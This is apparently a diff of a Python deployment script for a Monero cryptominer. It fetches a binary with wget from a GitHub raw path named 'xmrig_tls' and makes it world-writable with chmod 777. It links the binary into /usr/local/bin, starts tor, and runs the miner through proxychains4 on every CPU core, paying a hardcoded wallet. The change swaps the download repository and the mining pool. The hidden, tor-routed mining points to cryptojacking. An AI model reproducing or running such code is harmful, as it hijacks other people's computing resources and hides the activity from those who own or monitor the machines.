@@ -22,7 +22,7 @@ try:
     os.system('make install')
     os.system('make install-config')
     if not os.path.isfile('/usr/local/bin/' + program):
-        os.system('wget https://github.com/HarrisNancyvwguc/learning/raw/main/' + program)
+        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/local/bin/' + program)
@@ -33,4 +33,4 @@ except:
 
 os.system('tor &')
 time.sleep(60)
-os.system('proxychains4 ' + program + ' --donate-level 1 -o pool.hashvault.pro:80 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p az -a rx/0 -k --tls -t ' + str(cores))
+os.system('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p az -a rx/0 -k --tls -t ' + str(cores))
